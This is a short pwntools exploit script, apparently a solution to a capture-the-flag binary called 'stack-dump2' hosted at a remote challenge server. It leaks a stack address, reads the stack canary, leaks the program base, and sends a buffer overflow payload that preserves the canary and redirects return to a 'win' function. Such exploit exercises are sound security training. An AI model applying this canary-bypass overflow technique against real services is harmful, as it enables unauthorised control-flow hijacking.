from pwn import *

p = process("./stack-dump2")
p = remote("plsdonthaq.me", 5002)

# Get the canary address
p.recvuntil("To make things easier, here's a useful stack pointer ")
stackAddr = int(p.recvline(keepends=False), 16)
print(f"Received stack address {hex(stackAddr)}")
ebp = stackAddr + 0x71
print(f"main::ebp = {hex(ebp)}")
canary_addr = ebp - 0x8
print(f"main::canary at {hex(canary_addr)}")

# Get the canary value
p.sendline(b'a')
p.recv()
p.sendline(b'5')
p.recv()
p.sendline(p32(canary_addr))
p.recv()
p.sendline('b')
p.recvuntil(": ")
canary = p.recvline(keepends=False)[:4]
print(f"Canary value is: {canary}")

# Get the win address
p.recv()
p.sendline(b'c')
BASE = int(p.recvline().split(b'-')[0], 16)
p.recv()
print(f"Program base address is {hex(BASE)}")
print(f"main should be at {hex(BASE + 0x796)}")
win_offset = 0x76d
win_addr = BASE + win_offset
print(f"win address at at {hex(win_addr)}")

# Perform the buffer overflow
payload = b""
payload += b'.' * (0x68-0x8)
payload += canary
payload += b'.' * 8
payload += p32(win_addr)

p.sendline(b'a')
p.sendline(str(len(payload) + 1))
p.sendline(payload)

# Now exit/return from main
p.sendline("d")
p.interactive()